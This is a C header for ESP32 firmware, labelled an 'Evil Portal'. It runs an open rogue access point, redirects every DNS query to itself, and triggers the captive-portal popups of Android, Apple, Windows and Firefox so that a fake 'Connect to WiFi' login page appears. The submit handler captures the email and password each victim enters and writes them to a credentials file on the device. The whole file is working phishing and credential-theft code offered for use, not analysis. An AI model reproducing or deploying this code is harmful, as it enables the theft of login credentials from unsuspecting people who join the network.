// wifi_portal.h - Evil Portal with DNS hijack + HTTPS captive portal
#ifndef WIFI_PORTAL_H
#define WIFI_PORTAL_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "esp_https_server.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include <sys/stat.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"
#include "dhcpserver/dhcpserver.h"
#include "portal_certs.h"

static const char *PORTAL_TAG = "Portal";
static httpd_handle_t portal_http = NULL;
static httpd_handle_t portal_https = NULL;
static char portal_ssid[33] = {0};
static uint8_t portal_running = 0;
static TaskHandle_t dns_task_handle = NULL;
static uint8_t dns_running = 0;

// ==================== DNS SERVER ====================

static void portal_dns_task(void *param) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(PORTAL_TAG, "DNS socket failed");
        dns_running = 0;
        vTaskDelete(NULL);
        return;
    }

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(PORTAL_TAG, "DNS bind failed");
        close(sock);
        dns_running = 0;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ESP_LOGI(PORTAL_TAG, "DNS listening on :53");

    uint8_t buf[512];
    struct sockaddr_in client;
    socklen_t clen;
    uint8_t ip[4] = {192, 168, 4, 1};

    while (dns_running) {
        clen = sizeof(client);
        int len = recvfrom(sock, buf, sizeof(buf), 0,
                           (struct sockaddr *)&client, &clen);
        if (len < 12) continue;

        char domain[64] = {0};
        int d = 0, q = 12;
        while (q < len && buf[q] != 0 && d < 62) {
            uint8_t ll = buf[q++];
            if (ll > 63) break;
            if (d > 0) domain[d++] = '.';
            for (uint8_t j = 0; j < ll && q < len && d < 63; j++)
                domain[d++] = buf[q++];
        }
        domain[d] = 0;
        ESP_LOGI(PORTAL_TAG, "DNS: %s", domain);

        buf[2] = 0x85; buf[3] = 0x80;
        buf[6] = 0x00; buf[7] = 0x01;
        buf[8] = 0x00; buf[9] = 0x00;
        buf[10] = 0x00; buf[11] = 0x00;

        int pos = 12;
        while (pos < len && buf[pos] != 0) pos += buf[pos] + 1;
        pos += 5;

        buf[pos++] = 0xC0; buf[pos++] = 0x0C;
        buf[pos++] = 0x00; buf[pos++] = 0x01;
        buf[pos++] = 0x00; buf[pos++] = 0x01;
        buf[pos++] = 0x00; buf[pos++] = 0x00;
        buf[pos++] = 0x00; buf[pos++] = 0x01;
        buf[pos++] = 0x00; buf[pos++] = 0x04;
        memcpy(&buf[pos], ip, 4);
        pos += 4;

        sendto(sock, buf, pos, 0, (struct sockaddr *)&client, clen);
    }

    close(sock);
    dns_task_handle = NULL;
    ESP_LOGI(PORTAL_TAG, "DNS stopped");
    vTaskDelete(NULL);
}

// ==================== HTTP HANDLERS ====================
// Shared between HTTP (80) and HTTPS (443)

static esp_err_t portal_page_handler(httpd_req_t *req) {
    ESP_LOGI(PORTAL_TAG, "Serving portal page");

    FILE *f = fopen("/spiffs/sites/portal.html", "r");
    if (f) {
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz > 0 && sz < 32768) {
            char *html = malloc(sz + 1);
            if (html) {
                size_t rd = fread(html, 1, sz, f);
                html[rd] = 0;
                fclose(f);
                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, html, rd);
                free(html);
                return ESP_OK;
            }
        }
        fclose(f);
    }

    const char *fb =
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>WiFi Login</title><style>"
        "body{font-family:-apple-system,sans-serif;max-width:400px;margin:50px auto;padding:20px;background:#f5f5f5}"
        "h2{text-align:center}input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:6px;font-size:16px}"
        "button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px}"
        ".c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
        "</style></head><body><div class='c'><h2>Connect to WiFi</h2>"
        "<form method='POST' action='http://192.168.4.1/submit'>"
        "<input name='email' placeholder='Email' required>"
        "<input type='password' name='password' placeholder='Password' required>"
        "<button type='submit'>Connect</button></form></div></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, fb, strlen(fb));
    return ESP_OK;
}

static esp_err_t portal_submit_handler(httpd_req_t *req) {
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) { httpd_resp_send_500(req); return ESP_FAIL; }
    buf[ret] = 0;

    char email[128] = {0}, password[128] = {0};
    char *p;
    if ((p = strstr(buf, "email=")) != NULL) {
        p += 6; char *e = strchr(p, '&'); if (!e) e = p + strlen(p);
        int l = e - p; if (l > 127) l = 127; strncpy(email, p, l);
    }
    if ((p = strstr(buf, "password=")) != NULL) {
        p += 9; char *e = strchr(p, '&'); if (!e) e = p + strlen(p);
        int l = e - p; if (l > 127) l = 127; strncpy(password, p, l);
    }

    mkdir("/spiffs/captures", 0755);
    FILE *f = fopen("/spiffs/captures/credentials.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nEmail: %s\nPassword: %s\n---\n", portal_ssid, email, password);
        fclose(f);
        ESP_LOGI(PORTAL_TAG, "Captured: %s / %s", email, password);
    }

    const char *resp =
        "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>Connecting...</h2><p>Please wait.</p>"
        "<script>setTimeout(function(){window.location='http://192.168.4.1/';},3000);</script></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}


// wifi_portal.h - Add Android CaptivePortalLogin intent trigger

static esp_err_t portal_detect_handler(httpd_req_t *req) {
    ESP_LOGI(PORTAL_TAG, "Portal detect: %s", req->uri);
    
    // Android expects 204 for "no captive portal" but we want to trigger it
    // Return 200 with redirect to force portal popup
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
    httpd_resp_set_hdr(req, "Pragma", "no-cache");
    httpd_resp_set_hdr(req, "Expires", "0");
    
    // HTML meta redirect triggers Android's CaptivePortalLogin activity
    const char *html = 
        "<!DOCTYPE html><html><head>"
        "<meta http-equiv='refresh' content='0; url=http://192.168.4.1/'>"
        "</head><body>Redirecting...</body></html>";
    
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t portal_catchall_handler(httpd_req_t *req) {
    ESP_LOGI(PORTAL_TAG, "Catch-all: %s", req->uri);
    
    // For Android Chrome: return HTML with meta redirect instead of 302
    httpd_resp_set_status(req, "200 OK");
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    
    const char *html = 
        "<!DOCTYPE html><html><head>"
        "<meta http-equiv='refresh' content='0; url=http://192.168.4.1/'>"
        "</head><body>Redirecting to login...</body></html>";
    
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

// Register these additional Android-specific endpoints
static void portal_register_handlers(httpd_handle_t server) {
    httpd_uri_t u;

    u = (httpd_uri_t){.uri = "/", .method = HTTP_GET, .handler = portal_page_handler};
    httpd_register_uri_handler(server, &u);
    u = (httpd_uri_t){.uri = "/submit", .method = HTTP_POST, .handler = portal_submit_handler};
    httpd_register_uri_handler(server, &u);

    // Android specific - return 200 with HTML redirect, not 302
    u = (httpd_uri_t){.uri = "/generate_204", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);
    u = (httpd_uri_t){.uri = "/gen_204", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);
    
    // Chrome uses this
    u = (httpd_uri_t){.uri = "/connectivity-check.html", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);
    u = (httpd_uri_t){.uri = "/connectivitycheck/gstatic.html", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);

    // Apple
    u = (httpd_uri_t){.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);
    u = (httpd_uri_t){.uri = "/library/test/success.html", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);

    // Windows
    u = (httpd_uri_t){.uri = "/ncsi.txt", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);
    u = (httpd_uri_t){.uri = "/connecttest.txt", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);

    // Firefox
    u = (httpd_uri_t){.uri = "/success.txt", .method = HTTP_GET, .handler = portal_detect_handler};
    httpd_register_uri_handler(server, &u);

    // Catch-all LAST (wildcard matches everything)
    u = (httpd_uri_t){.uri = "/*", .method = HTTP_GET, .handler = portal_catchall_handler};
    httpd_register_uri_handler(server, &u);
}
// ==================== REGISTER HANDLERS ====================

// ==================== START / STOP ====================

static inline uint8_t portal_start(const char *ssid) {
    if (portal_running) return 0;

    strncpy(portal_ssid, ssid, 32);
    portal_ssid[32] = 0;

    esp_wifi_disconnect();
    esp_wifi_stop();
    esp_wifi_deinit();
    vTaskDelay(pdMS_TO_TICKS(200));

    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);

    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap) ap = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    wifi_config_t wc = {
        .ap = {
            .ssid_len = strlen(ssid),
            .channel = 6,
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .beacon_interval = 100,
        },
    };
    strncpy((char *)wc.ap.ssid, ssid, 32);
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wc));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(PORTAL_TAG, "AP started: %s", ssid);

    // DHCP: advertise ourselves as DNS
    esp_netif_dhcps_stop(ap);
    esp_netif_dns_info_t dns = {0};
    dns.ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1);
    dns.ip.type = ESP_IPADDR_TYPE_V4;
    ESP_ERROR_CHECK(esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns));
    dhcps_offer_t offer = OFFER_DNS;
    ESP_ERROR_CHECK(esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET,
        ESP_NETIF_DOMAIN_NAME_SERVER, &offer, sizeof(offer)));
    ESP_ERROR_CHECK(esp_netif_dhcps_start(ap));
    ESP_LOGI(PORTAL_TAG, "DHCP DNS=192.168.4.1");

    // SPIFFS
    esp_vfs_spiffs_conf_t sc = {
        .base_path = "/spiffs", .partition_label = NULL,
        .max_files = 5, .format_if_mount_failed = true
    };
    err = esp_vfs_spiffs_register(&sc);
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE)
        ESP_LOGW(PORTAL_TAG, "SPIFFS: %s", esp_err_to_name(err));
    mkdir("/spiffs/sites", 0755);
    mkdir("/spiffs/captures", 0755);

    // DNS hijack
    dns_running = 1;
    xTaskCreate(portal_dns_task, "dns", 4096, NULL, 5, &dns_task_handle);

    // HTTP server on port 80
    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.server_port = 80;
    hc.uri_match_fn = httpd_uri_match_wildcard;
    hc.max_uri_handlers = 14;
    hc.lru_purge_enable = true;

    if (httpd_start(&portal_http, &hc) != ESP_OK) {
        ESP_LOGE(PORTAL_TAG, "HTTP start failed");
        dns_running = 0;
        return 0;
    }
    portal_register_handlers(portal_http);
    ESP_LOGI(PORTAL_TAG, "HTTP listening on :80");

    // HTTPS server on port 443 with self-signed cert
    httpd_ssl_config_t ssl = HTTPD_SSL_CONFIG_DEFAULT();
    ssl.servercert = portal_cert_pem;
    ssl.servercert_len = portal_cert_pem_len;
    ssl.prvtkey_pem = portal_key_pem;
    ssl.prvtkey_len = portal_key_pem_len;
    ssl.httpd.uri_match_fn = httpd_uri_match_wildcard;
    ssl.httpd.max_uri_handlers = 14;
    ssl.httpd.lru_purge_enable = true;
    ssl.transport_mode = HTTPD_SSL_TRANSPORT_SECURE;

    if (httpd_ssl_start(&portal_https, &ssl) != ESP_OK) {
        ESP_LOGW(PORTAL_TAG, "HTTPS start failed - continuing with HTTP only");
    } else {
        portal_register_handlers(portal_https);
        ESP_LOGI(PORTAL_TAG, "HTTPS listening on :443");
    }

    ESP_LOGI(PORTAL_TAG, "Portal active on 192.168.4.1");
    portal_running = 1;
    return 1;
}

static inline void portal_stop(void) {
    if (!portal_running) return;

    dns_running = 0;
    uint8_t wait = 0;
    while (dns_task_handle && wait++ < 30)
        vTaskDelay(pdMS_TO_TICKS(100));

    if (portal_http) { httpd_stop(portal_http); portal_http = NULL; }
    if (portal_https) { httpd_ssl_stop(portal_https); portal_https = NULL; }

    esp_wifi_stop();
    portal_running = 0;
    ESP_LOGI(PORTAL_TAG, "Portal stopped");
}

static inline uint8_t portal_is_running(void) {
    return portal_running;
}

#endif
